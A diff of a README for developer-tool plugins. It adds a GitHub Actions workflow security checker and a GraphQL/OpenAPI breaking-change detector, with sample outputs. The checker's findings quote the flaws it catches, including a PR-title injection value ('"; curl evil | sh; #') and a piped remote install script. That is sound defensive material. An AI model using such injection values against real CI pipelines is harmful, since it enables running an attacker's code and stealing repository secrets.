@@ -333,6 +333,169 @@ Note `PORT` is read by the code but **not** flagged — it's a well-known runtim
 
 ---
 
+## 🔐 actions-guard
+
+### Harden a GitHub Actions workflow
+
+**Ask Claude:** _Is my CI workflow secure? Check for pwn requests and script injection._
+
+The skill activates and runs:
+
+```bash
+analyze_workflow.py unsafe   # a repo root; finds .github/workflows/*.yml
+```
+
+Output:
+
+```console
+actions-guard found 7 issue(s): 1 critical, 3 high, 3 medium
+
+[CRITICAL] GHA002  pull_request_target checks out untrusted PR code
+  at unsafe/.github/workflows/ci.yml:1
+  > on: pull_request_target + checkout of PR head
+  why: A `pull_request_target` / `workflow_run` workflow runs with repo secrets and a write token, and here it checks out the PR head — so a fork PR can run its own code with your secrets (a 'pwn request').
+  fix: Don't check out and build untrusted PR code in a privileged trigger. Use `pull_request` for build/test, and if you need labels/comments, keep the privileged job separate and never run PR-controlled code.
+
+[HIGH] GHA001  Action pinned to a mutable ref, not a commit SHA
+  at unsafe/.github/workflows/ci.yml:13
+  > - uses: some-org/deploy-action@main # GHA001: branch ref (high)
+  why: `some-org/deploy-action@main` is pinned to a tag/branch. Tags are mutable — the owner (or an attacker who compromises them) can move `main` to malicious code that then runs in your CI.
+  fix: Pin to a full 40-char commit SHA: `some-org/deploy-action@<sha>  # main`. 
+
+[HIGH] GHA003  Script injection: untrusted input in a run: shell
+  at unsafe/.github/workflows/ci.yml:15
+  > echo "Building PR: ${{ github.event.pull_request.title }}"
+  why: An attacker-controlled expression (e.g. a PR title, branch name, or issue body) is interpolated straight into the shell. A crafted value like `"; curl evil | sh; #` runs arbitrary commands in your CI.
+  fix: Never interpolate `github.event.*` / `github.head_ref` into `run:`. Bind it to an `env:` variable and reference it quoted (`"$TITLE"`), so the value can't break out of the string.
+
+[HIGH] GHA007  Remote script piped into a shell
+  at unsafe/.github/workflows/ci.yml:18
+  > curl -sSL https://example.com/install.sh | sh
+  why: `curl ... | sh` in CI executes unreviewed, unpinned remote code with your workflow's privileges — a supply-chain foothold.
+  fix: Download to a file, verify a checksum/signature, then run it; or use a SHA-pinned action instead.
+
+[MEDIUM] GHA004  No permissions: block — token defaults to broad scope
+  at unsafe/.github/workflows/ci.yml:1
+  why: Without an explicit `permissions:` key, the `GITHUB_TOKEN` gets the repository/organization default, often read-write to everything.
+  fix: Add a top-level `permissions:` set to least privilege (e.g. `permissions: {contents: read}`) and widen per-job only as needed.
+
+[MEDIUM] GHA001  Action pinned to a mutable ref, not a commit SHA
+  at unsafe/.github/workflows/ci.yml:10
+  > - uses: actions/checkout@v4 # GHA001: mutable tag, not a SHA
+  why: `actions/checkout@v4` is pinned to a tag/branch. Tags are mutable — the owner (or an attacker who compromises them) can move `v4` to malicious code that then runs in your CI.
+  fix: Pin to a full 40-char commit SHA: `actions/checkout@<sha>  # v4`. (Even first-party actions are safer SHA-pinned.)
+
+[MEDIUM] GHA005  Secret interpolated directly into run:
+  at unsafe/.github/workflows/ci.yml:19
+  > publish --token ${{ secrets.NPM_TOKEN }}
+  why: Interpolating `${{ secrets.* }}` into the script bakes the secret into the command line (visible in process listings / logs on error) and risks injection if combined with untrusted input.
+  fix: Pass secrets via `env:` on the step (`env: {TOKEN: ${{ secrets.TOKEN }}}`) and reference `"$TOKEN"` in the script.
+
+FAIL: findings at or above 'high'.
+```
+
+_Exit code: **1**_ — non-zero because findings met the threshold, so this also fails a CI check.
+
+---
+
+### The hardened workflow passes
+
+```console
+actions-guard: no issues detected. ✓
+```
+
+_Exit code: **0**_
+
+---
+
+## 🔁 api-contract-guard
+
+### Catch a breaking API change (GraphQL)
+
+**Ask Claude:** _Did I break the API? Diff the old and new schema._
+
+The skill activates and runs:
+
+```bash
+analyze_contract.py schema.old.graphql schema.new.graphql
+```
+
+Output:
+
+```console
+api-contract-guard [graphql] found 6 change(s): 5 high, 1 info
+
+[HIGH] GQL004  Removed field
+  at Query.posts
+  why: Clients selecting this field get a validation error.
+  fix: Deprecate with @deprecated before removal.
+
+[HIGH] GQL006  New required argument
+  at Query.user(region:)
+  why: A new non-null argument without a default rejects existing queries that omit it.
+  fix: Make it nullable or give it a default value.
+
+[HIGH] GQL003  Removed enum/union member
+  at Role.GUEST
+  why: Clients that send or match this value break.
+  fix: Keep the member, or deprecate it first.
+
+[HIGH] GQL004  Removed field
+  at User.age
+  why: Clients selecting this field get a validation error.
+  fix: Deprecate with @deprecated before removal.
+
+[HIGH] GQL005  Field type changed
+  at User.name (String -> Int)
+  why: A changed field type can break client deserialization or non-null expectations.
+  fix: Add a new field instead of changing this one.
+
+[INFO] GQL100  New type (additive)
+  at Team
+  why: A new type was added — non-breaking.
+  fix: No action needed.
+
+FAIL: breaking changes at or above 'high'.
+```
+
+_Exit code: **1**_ — non-zero because findings met the threshold, so this also fails a CI check.
+
+It auto-detects the format — pass two OpenAPI/Swagger JSON files and it diffs paths, operations, and required parameters instead.
+
+---
+
+### The same tool on OpenAPI / Swagger (JSON)
+
+```console
+api-contract-guard [openapi] found 4 change(s): 3 high, 1 info
+
+[HIGH] OAS001  Removed endpoint
+  at /reports
+  why: The path no longer exists; clients calling it get a 404.
+  fix: Restore the path, or deprecate it for a release before removal.
+
+[HIGH] OAS004  Parameter became required
+  at POST /users (role in query)
+  why: A previously optional parameter is now required; clients that don't send it break.
+  fix: Keep it optional, or version the endpoint.
+
+[HIGH] OAS003  New required parameter
+  at POST /users (team in query)
+  why: A new required parameter means existing clients that omit it now get rejected.
+  fix: Make the parameter optional, or version the endpoint.
+
+[INFO] OAS100  New endpoint (additive)
+  at /audit
+  why: A new path was added — non-breaking.
+  fix: No action needed.
+
+FAIL: breaking changes at or above 'high'.
+```
+
+_Exit code: **1**_
+
+---
+
 ## 🔍 regression-finder
 
 ### Find the commit that broke a test
@@ -367,7 +530,7 @@ running 'sh' '-c' 'python3 -B test_calc.py'
 0a1b2c3 is the first bad commit
 commit 0a1b2c3
 Author: dev <dev@example.com>
-Date:   Mon Jun 22 15:05:38 2026 +0000
+Date:   Thu Jul 23 17:26:14 2026 +0000
 
     refactor add (introduces bug)
 
@@ -387,7 +550,7 @@ AssertionError
 
 ============================================================
 CULPRIT — first commit where the command fails:
-  0a1b2c3  dev  2026-06-22
+  0a1b2c3  dev  2026-07-23
   refactor add (introduces bug)
 
 Files changed:
@@ -415,6 +578,16 @@ Each analyzer exits non-zero when a finding meets `--fail-on`, so they drop stra
     python3 plugins/llm-app-doctor/skills/llm-app-doctor/scripts/analyze_llm_code.py ./src --fail-on high
     python3 plugins/dockerfile-doctor/skills/dockerfile-doctor/scripts/analyze_dockerfile.py Dockerfile --fail-on high
     python3 plugins/env-doctor/skills/env-doctor/scripts/analyze_env.py . --fail-on high
+    python3 plugins/actions-guard/skills/actions-guard/scripts/analyze_workflow.py . --fail-on high
+```
+
+`api-contract-guard` takes the *old* and *new* schema as two arguments, so in CI diff the base branch against the PR:
+
+```yaml
+- name: Breaking API change check
+  run: |
+    git show origin/main:openapi.json > /tmp/old.json
+    python3 plugins/api-contract-guard/skills/api-contract-guard/scripts/analyze_contract.py /tmp/old.json openapi.json --fail-on high
 ```
 
 This repo's own CI (`.github/workflows/ci.yml`) runs the full harness `tests/run_all.py` across Python 3.9–3.12 on every push.
